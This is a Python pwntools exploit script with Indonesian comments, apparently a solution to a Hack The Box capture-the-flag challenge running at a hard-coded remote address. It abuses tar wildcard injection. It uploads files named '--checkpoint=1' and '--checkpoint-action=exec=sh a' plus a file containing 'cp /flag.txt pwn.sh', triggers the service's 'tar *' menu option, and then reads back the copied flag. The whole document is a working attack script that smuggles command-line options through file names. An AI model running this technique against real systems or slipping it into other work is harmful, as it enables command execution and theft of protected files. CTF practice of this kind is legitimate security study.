from pwn import *

# Konfigurasi Target
host = '154.57.164.70'
port = 30783

# Supaya rapi, kita set log level ke info
context.log_level = 'info'

def get_conn():
    return remote(host, port)

def upload(r, filename, content):
    r.sendlineafter(b'>>> ', b'1')
    r.sendlineafter(b'file name: ', filename.encode())
    # Kirim konten diikuti dengan EOF di baris baru
    r.sendlineafter(b'done)', content.encode() + b'\nEOF')
    log.info(f"Uploaded: {filename}")

def solve():
    r = get_conn()

    log.info("--- Memulai Operasi Pencurian Flag ---")

    # Langkah 1: Upload file pancingan (ID 0) yang nanti akan kita overwrite
    upload(r, "pwn.sh", "pancingan awal")

    # Langkah 2: Upload trigger checkpoint tar
    upload(r, "--checkpoint=1", "trigger")

    # Langkah 3: Upload file 'a' yang berisi command untuk copy flag
    # Kita overwrite pwn.sh (file ID 0)
    upload(r, "a", "cp /flag.txt pwn.sh")

    # Langkah 4: Upload action trigger (sudah diperpendek agar lolos filter length)
    upload(r, "--checkpoint-action=exec=sh a", "action")

    log.info("--- Memicu Wildcard Injection (Opsi 5) ---")
    # Pilih Opsi 5 untuk menjalankan 'tar *'
    r.sendlineafter(b'>>> ', b'5')
    
    # Beri jeda sebentar agar server selesai kompresi & eksekusi shell
    time.sleep(1)

    log.info("--- Membaca hasil overwrite di pwn.sh (ID 0) ---")
    # Pilih Opsi 4 (Print)
    r.sendlineafter(b'>>> ', b'4')
    # Masukkan Identifier 0
    r.sendlineafter(b'identifier:', b'0')

    # Cari Flag di output
    print("\n" + "="*30)
    print("       FLAG DITEMUKAN!")
    print("="*30)
    
    # Terima sisa data dan tampilkan
    output = r.recvall(timeout=2).decode()
    # Gunakan regex atau filter manual untuk mempercantik output
    for line in output.split('\n'):
        if "HTB{" in line:
            print(f"RESULT: {line.strip()}")
            break
    
    r.close()

if __name__ == "__main__":
    solve()
